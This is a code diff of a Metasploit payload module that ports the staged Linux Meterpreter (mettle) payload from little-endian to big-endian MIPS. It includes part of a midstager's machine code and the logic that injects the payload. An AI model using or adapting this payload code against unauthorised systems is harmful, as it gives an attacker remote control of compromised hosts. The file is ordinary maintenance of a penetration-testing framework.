@@ -3,8 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/base/sessions/meterpreter_mipsle_linux'
+require 'msf/base/sessions/meterpreter_mipsbe_linux'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
 require 'rex/elfparsey'
@@ -17,15 +16,15 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name'          => 'Linux Meterpreter',
-        'Description'   => 'Inject the mettle server payload (staged)',
-        'Author'        => [
+        'Name'        => 'Linux Meterpreter',
+        'Description' => 'Inject the mettle server payload (staged)',
+        'Author'      => [
           'Adam Cammack <adam_cammack[at]rapid7.com>'
         ],
-        'Platform'      => 'linux',
-        'Arch'          => ARCH_MIPSLE,
-        'License'       => MSF_LICENSE,
-        'Session'       => Msf::Sessions::Meterpreter_mipsle_Linux
+        'Platform'    => 'linux',
+        'Arch'        => ARCH_MIPSBE,
+        'License'     => MSF_LICENSE,
+        'Session'     => Msf::Sessions::Meterpreter_mipsbe_Linux
       )
     )
   end
@@ -86,13 +85,13 @@ module MetasploitModule
       0x02058020,                # add   s0,s0,a1
       0x02000008,                # jr    s0
       0
-    ].pack('V*')
+    ].pack('N*')
 
     vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
     conn.put(midstager) == midstager.length
   end
 
   def generate_stage(opts = {})
-    MetasploitPayloads::Mettle.new('mipsel-linux-muslsf', generate_config(opts)).to_binary :process_image
+    MetasploitPayloads::Mettle.new('mips-linux-muslsf', generate_config(opts)).to_binary :process_image
   end
 end
